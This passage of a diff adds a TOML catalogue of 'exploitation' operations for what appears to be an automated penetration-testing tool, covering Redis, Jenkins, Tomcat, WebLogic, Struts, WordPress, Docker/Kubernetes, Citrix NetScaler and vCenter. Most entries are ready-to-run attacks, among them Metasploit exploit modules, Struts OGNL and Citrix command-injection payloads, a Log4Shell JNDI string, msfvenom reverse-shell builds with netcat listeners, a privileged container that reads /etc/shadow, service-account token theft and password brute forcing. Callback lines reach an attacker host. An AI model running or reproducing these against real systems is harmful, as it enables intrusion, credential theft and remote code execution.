+args = ['-h', '{rhost}', 'module', 'list']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Redis Script Info'
+args = ['-sV', '-p', '6379', '--script', 'redis-info', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider]]
+name_placeholder3 = true
+[[capability.provider.operation]]
+name = 'Redis Unauth Script'
+args = ['-p', '6379', '--script', 'redis-brute', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Redis Unauth Exploit'
+args = ['-q', '-x', 'use exploit/linux/redis/redis_unauth_exec', '-x', 'set RHOSTS {rhost}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Rogue Master Sync RCE'
+args = ['-h', '{rhost}', 'slaveof', '{lhost}', '6379']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Rogue Master Listener'
+args = ['-lvnp', '6379']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Keyspace Cred Hunt'
+args = ['-h', '{rhost}', 'keys', '*']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.jenkins-rce'
+phase = 'exploitation'
+label = 'JENKINS RCE'
+summary = 'Exploit Jenkins script consoles and unauthenticated endpoints'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jenkins Console Probe'
+args = ['-sk', '{url}/script']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Jenkins Groovy Exec'
+args = ['-sk', '--data-urlencode', 'script=println "id".execute().text', '{url}/script']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Jenkins CLI Probe'
+args = ['-sk', '{url}/cli']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Jenkins WhoAmI Probe'
+args = ['-sk', '{url}/whoAmI/']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Jenkins Users Enum'
+args = ['-sk', '{url}/asynchPeople/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'java'
+[[capability.provider.operation]]
+name = 'Jenkins CLI Exploit'
+args = ['-jar', 'jenkins-cli.jar', '-s', '{url}', 'who-am-i']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Jenkins Template Sweep'
+args = ['-u', '{url}', '-tags', 'jenkins,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Jenkins Groovy Exploit'
+args = ['-q', '-x', 'use exploit/multi/http/jenkins_script_console', '-x', 'set RHOSTS {url}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jenkins Reverse Trigger'
+args = ['-sk', '--data-urlencode', 'script=println "curl http://{lhost}:9001".execute().text', '{url}/script']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Jenkins Callback Listener'
+args = ['-lvnp', '9001']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jenkins Crumb Bypass Probe'
+args = ['-sk', '{url}/crumbIssuer/api/json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Jenkins Path Fuzz'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,403', '-t', '10']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jenkins Create Job RCE'
+args = ['-sk', '-X', 'POST', '{url}/createItem', '-d', '<?xml version="1.0"?>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider]]
+name_placeholder4 = true
+[[capability.provider.operation]]
+name = 'Jenkins Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-title', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jenkins Config Exfil Probe'
+args = ['-sk', '{url}/credentials/store/system/domain/_/']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.tomcat-deploy-rce'
+phase = 'exploitation'
+label = 'TOMCAT DEPLOY RCE'
+summary = 'Exploit Tomcat manager and WAR deployment for RCE'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'rport', type = 'port', required = false, default = '8080' },
+  { key = 'username', type = 'username', required = false, default = 'tomcat' },
+  { key = 'password', type = 'password', required = false, default = 'tomcat' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Manager Status Probe'
+args = ['-sk', 'http://{rhost}:{rport}/manager/html']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Manager Text Deploy'
+args = ['-sk', '-u', '{username}:{password}', 'http://{rhost}:{rport}/manager/text/deploy?path=/tsapp', '--upload-file', 'shell.war']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Deployed Shell Trigger'
+args = ['-sk', 'http://{rhost}:{rport}/tsapp/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfvenom'
+[[capability.provider.operation]]
+name = 'WAR Payload Build'
+args = ['-p', 'java/jsp_shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'war', '-o', 'shell.war']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Deploy Callback Listener'
+args = ['-lvnp', '{lport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Tomcat Deploy Exploit'
+args = ['-q', '-x', 'use exploit/multi/http/tomcat_mgr_upload', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'set HttpUsername {username}', '-x', 'set HttpPassword {password}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'Tomcat Cred Brute'
+args = ['-l', '{username}', '-P', '/usr/share/wordlists/rockyou.txt', 'http-get://{rhost}:{rport}/manager/html']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Tomcat Script Enum'
+args = ['-sV', '-p', '{rport}', '--script', 'http-enum', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Tomcat Template Sweep'
+args = ['-u', '{rhost}:{rport}', '-tags', 'tomcat', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Host Manager Probe'
+args = ['-sk', '-u', '{username}:{password}', 'http://{rhost}:{rport}/host-manager/html']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider]]
+name_placeholder5 = true
+[[capability.provider.operation]]
+name = 'Examples Path Probe'
+args = ['-sk', 'http://{rhost}:{rport}/examples/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'JSP Upload Trigger'
+args = ['-sk', 'http://{rhost}:{rport}/shell/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Tomcat Cred Spray'
+args = ['http', '{rhost}:{rport}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'Tomcat TLS Audit'
+args = ['{rhost}:{rport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'WAR Artifact Verify'
+args = ['shell.war']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'exploitation.weblogic-rce'
+phase = 'exploitation'
+label = 'WEBLOGIC RCE'
+summary = 'Exploit WebLogic T3 deserialization and console vectors'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'rport', type = 'port', required = false, default = '7001' },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Weblogic Deser Exploit'
+args = ['-q', '-x', 'use exploit/multi/misc/weblogic_deserialize_rawobject', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'T3 Protocol Detect'
+args = ['-sV', '-p', '{rport}', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Console Path Probe'
+args = ['-sk', 'http://{rhost}:{rport}/console/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'UDDI Probe'
+args = ['-sk', 'http://{rhost}:{rport}/uddi/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Weblogic Template Sweep'
+args = ['-u', '{rhost}:{rport}', '-tags', 'weblogic,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'java'
+[[capability.provider.operation]]
+name = 'T3 Payload Build'
+args = ['-jar', 'ysoserial.jar', 'CommonsCollections5', 'curl http://{lhost}:9001', '>', '/tmp/t3payload.ser']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'T3 Handshake Probe'
+args = ['t3_probe.py', '--host', '{rhost}', '--port', '{rport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Weblogic Callback Listener'
+args = ['-lvnp', '9001']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'IIOP Probe'
+args = ['-sk', 'http://{rhost}:{rport}/iiop']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Weblogic Vuln Script'
+args = ['-sV', '-p', '{rport}', '--script', 'weblogic-t3-info', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Weblogic Admin Cred Module'
+args = ['-q', '-x', 'use auxiliary/gather/weblogic_admin_cred', '-x', 'set RHOSTS {rhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Weblogic REST Deploy Probe'
+args = ['-sk', 'http://{rhost}:{rport}/management/tenant-monitoring/servers']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'Weblogic TLS Audit'
+args = ['{rhost}:{rport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Weblogic Tech Confirm'
+args = ['-u', '{rhost}:{rport}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Weblogic Path Fuzz'
+args = ['-u', 'http://{rhost}:{rport}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302,403', '-t', '20']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.struts-ognl-rce'
+phase = 'exploitation'
+label = 'STRUTS OGNL RCE'
+summary = 'Exploit Apache Struts OGNL injection for RCE'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S2-045 Content-Type RCE'
+args = ['-sk', '{url}', '-H', 'Content-Type: %{{(#n=multi(#n.memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec("id"))}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S2-046 Filename RCE'
+args = ['-sk', '{url}', '-F', 'upload=@${{(#n=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime().exec("id"))}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S2-057 Path OGNL Inject'
+args = ['-sk', '{url}/$%7B7*7%7D/action']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S2-048 ActionMessage Inject'
+args = ['-sk', '{url}/struts-dev-mode.action', '-d', 'name=%{{(#rt=@java.lang.Runtime@getRuntime()).exec("id")}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'OGNL Reverse Trigger'
+args = ['-sk', '{url}', '-H', 'Content-Type: %{{(#rt=@java.lang.Runtime@getRuntime().exec("curl http://{lhost}:9001"))}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Struts Callback Listener'
+args = ['-lvnp', '9001']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Struts Template Sweep'
+args = ['-u', '{url}', '-tags', 'struts,ognl,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Struts Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Struts ShowConfig Probe'
+args = ['-sk', '{url}/showConfig.action']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Debug OGNL Eval Probe'
+args = ['-sk', '{url}/debug/ognl', '-d', 'expression=7*7']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Struts Action Fuzz'
+args = ['-u', '{url}/FUZZ.action', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Rest Plugin OGNL Inject'
+args = ['-sk', '{url}/index;id.action']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Struts Service Fingerprint'
+args = ['-sV', '-p', '80,443,8080', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Struts Msf Exploit'
+args = ['-q', '-x', 'use exploit/multi/http/struts_content_type_ognl', '-x', 'set RHOSTS {url}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.wordpress-rce'
+phase = 'exploitation'
+label = 'WORDPRESS RCE'
+summary = 'Exploit vulnerable WordPress plugins and themes for RCE'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'wpscan'
+[[capability.provider.operation]]
+name = 'Full Plugin Scan'
+args = ['--url', '{url}', '--enumerate', 'vp,vt,u', '--plugins-detection', 'aggressive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wpscan'
+[[capability.provider.operation]]
+name = 'Theme Vuln Scan'
+args = ['--url', '{url}', '--enumerate', 'vt']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'REST User Enum'
+args = ['-sk', '{url}/wp-json/wp/v2/users']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XMLRPC Pingback Probe'
+args = ['-sk', '{url}/xmlrpc.php', '-d', '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'WP Template Sweep'
+args = ['-u', '{url}', '-tags', 'wordpress,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Plugin Upload Shell'
+args = ['-sk', '-F', 'pluginzip=@shell.zip', '{url}/wp-admin/update.php?action=upload-plugin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfvenom'
+[[capability.provider.operation]]
+name = 'WP Plugin Zip Build'
+args = ['-p', 'php/reverse_php', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'raw', '-o', 'shell.php']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Shell Path Trigger'
+args = ['-sk', '{url}/wp-content/plugins/shell/shell.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'WP Callback Listener'
+args = ['-lvnp', '{lport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wpscan'
+[[capability.provider.operation]]
+name = 'Password Attack'
+args = ['--url', '{url}', '--usernames', 'admin', '--passwords', '/usr/share/wordlists/rockyou.txt']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Debug Log Exfil Probe'
+args = ['-sk', '{url}/wp-content/debug.log']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'WP Path Fuzz'
+args = ['-u', '{url}/wp-content/plugins/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt', '-mc', '200,403', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Config Backup Probe'
+args = ['-sk', '{url}/wp-config.php.bak']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'WP Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-title', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wpscan'
+[[capability.provider]]
+name_placeholder6 = true
+[[capability.provider.operation]]
+name = 'Aggressive User Enum'
+args = ['--url', '{url}', '--enumerate', 'u', '--users-detection', 'aggressive']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.container-runtime-rce'
+phase = 'exploitation'
+label = 'CONTAINER RUNTIME RCE'
+summary = 'Exploit container runtime and orchestration for host RCE'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'socket', type = 'file', required = false, default = '/var/run/docker.sock' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker API Version Probe'
+args = ['-sk', '--unix-socket', '{socket}', 'http://localhost/version']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker Priv Container Spawn'
+args = ['-sk', '-X', 'POST', '--unix-socket', '{socket}', '-H', 'Content-Type: application/json', '-d', '{"Image":"alpine","Cmd":["cat","/etc/shadow"],"Binds":["/:/host"],"Privileged":true}', 'http://localhost/containers/create?name=tsprobe']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker Container Start'
+args = ['-sk', '-X', 'POST', '--unix-socket', '{socket}', 'http://localhost/containers/tsprobe/start']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker Container Output Pull'
+args = ['-sk', '--unix-socket', '{socket}', 'http://localhost/containers/tsprobe/logs?stdout=1']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker Socket Remote Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{rhost}:2375/version']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Remote Docker API Spawn'
+args = ['-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"Image":"alpine","Cmd":["id"]}', 'http://{rhost}:2375/containers/create?name=tsremote']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'kubectl'
+[[capability.provider.operation]]
+name = 'K8s Pod List'
+args = ['get', 'pods', '--all-namespaces', '--token', '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)', '--server', 'https://{rhost}:6443', '--insecure-skip-tls-verify']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'kubectl'
+[[capability.provider.operation]]
+name = 'K8s Priv Pod Exec'
+args = ['exec', '-it', 'ts-pod', '--', '/bin/sh', '-c', 'id', '--token', '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Kubelet Unauth Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{rhost}:10250/pods']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Kubelet Exec Probe'
+args = ['-sk', '-X', 'POST', 'http://{rhost}:10250/run/namespace/pod/container', '-d', 'cmd=id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'K8s Template Sweep'
+args = ['-u', '{rhost}:10250', '-tags', 'kubernetes,k8s', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Container Port Sweep'
+args = ['-sV', '-p', '2375,2376,10250,10255,6443,8001', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Service Account Token Pull'
+args = ['/var/run/secrets/kubernetes.io/serviceaccount/token']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'capsh'
+[[capability.provider.operation]]
+name = 'Runtime Capability Check'
+args = ['--print']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Mount Info Escape Check'
+args = ['/proc/mounts']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'exploitation.citrix-netscaler-rce'
+phase = 'exploitation'
+label = 'CITRIX NETSCALER RCE'
+summary = 'Exploit Citrix NetScaler ADC RCE and info leak vectors'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'NS Config Leak Probe'
+args = ['-sk', 'https://{rhost}/menu/st4/st1.js']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Citrix Traversal Probe'
+args = ['-sk', 'https://{rhost}/vpns/portal/scripts/newlogin.pl?wrapper=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Citrix RCE Perl Inject'
+args = ['-sk', 'https://{rhost}/vpns/portal/scripts/newlogin.pl?wrapper=,%24r%3Dsystem(%22id%22)%3B']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'NS Gateway Probe'
+args = ['-sk', 'https://{rhost}/vpn/index.html']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Citrix Template Sweep'
+args = ['-u', '{rhost}', '-tags', 'citrix,netscaler,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Reverse Shell Trigger'
+args = ['-sk', 'https://{rhost}/vpns/portal/scripts/newlogin.pl?wrapper=,%24r%3Dsystem(%22curl+http://{lhost}:9001%22)%3B']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Citrix Callback Listener'
+args = ['-lvnp', '9001']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'NetScaler TLS Audit'
+args = ['{rhost}:443']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'NetScaler Service Sweep'
+args = ['-sV', '-p', '80,443,4430', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'NS Admin Interface Probe'
+args = ['-sk', 'https://{rhost}/nitro/v1/stat/system']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'NetScaler Tech Confirm'
+args = ['-u', '{rhost}', '-tech-detect', '-title', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'NS Cookie Session Leak'
+args = ['-skI', 'https://{rhost}/vpn/tm/ls.pl']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Citrix CVE List Sweep'
+args = ['-l', '/tmp/urls.txt', '-tags', 'citrix', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Gateway Credential Vault Probe'
+args = ['-sk', 'https://{rhost}/logon/LogonPoint/index.html']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Citrix Path Fuzz'
+args = ['-u', 'https://{rhost}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302', '-t', '20']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.vcenter-rce'
+phase = 'exploitation'
+label = 'VCENTER RCE'
+summary = 'Exploit VMware vCenter RCE and SSRF vectors'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VAMI SSRF Probe'
+args = ['-sk', 'https://{rhost}/ui/vropspluginui/rest/services/updatevm', '-X', 'POST']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VCenter Log4Shell Probe'
+args = ['-sk', 'https://{rhost}', '-A', '${{jndi:ldap://{lhost}:8888/vc}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VCenter OpenAPI Probe'
+args = ['-sk', 'https://{rhost}/openapi/ui/']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VCenter Upload RCE Chain'
+args = ['-sk', 'https://{rhost}/ui/vropspluginui/rest/services/uploadova']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'VCenter Template Sweep'
+args = ['-u', '{rhost}', '-tags', 'vmware,vcenter,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'VCenter Callback Listener'
+args = ['-lvnp', '8888']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'VCenter TLS Audit'
+args = ['{rhost}:443']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'VCenter Port Sweep'
+args = ['-sV', '-p', '443,443,9443,8080', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VCenter SSO Admin Probe'
+args = ['-sk', 'https://{rhost}/websso/SAML2/SSO']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'VCenter Tech Confirm'
+args = ['-u', '{rhost}', '-tech-detect', '-title', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VCenter Data Access Probe'
+args = ['-sk', 'https://{rhost}/mob']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'VCenter API Token Probe'
+args = ['-sk', '-X', 'POST', 'https://{rhost}/api/session', '-d', '{}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'VMware CVE Critical Sweep'
+args = ['-l', '/tmp/urls.txt', '-tags', 'vmware', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
